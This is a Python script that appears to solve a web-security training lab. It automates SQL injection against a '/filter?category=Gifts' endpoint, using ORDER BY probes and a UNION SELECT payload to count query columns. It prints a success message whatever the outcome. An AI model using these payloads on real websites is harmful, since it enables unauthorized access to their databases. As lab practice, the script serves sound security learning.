#Lab: SQL injection UNION attack, determining the number of columns returned by the query

import requests
import sys 
import urllib3

#Disable warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Making request go through the proxy for debugging 
proxy = {"http":"http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


#Checking the number of columns
def count_columns(url):
    for i in range(1,21):
        payload = f"'ORDER BY {i}--"
        request = requests.get(url + uri + payload, verify=False, proxies=proxy)
        if "Internal Server Error" in request.text:
            return i - 1


#Exploiting the app 
def exploit(url):
    middle_part = ",null " * (count_columns(url)-1)
    payload = "'UNION SELECT null " + middle_part + "from information_schema.tables--"
    request = requests.get(url + uri + payload, verify=False, proxies=proxy)
    if "OK" in request.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
    uri = "/filter?category=Gifts"
    exploit(url)
    print(f"Exploited successfully. There are {count_columns(url)} columns")

    

    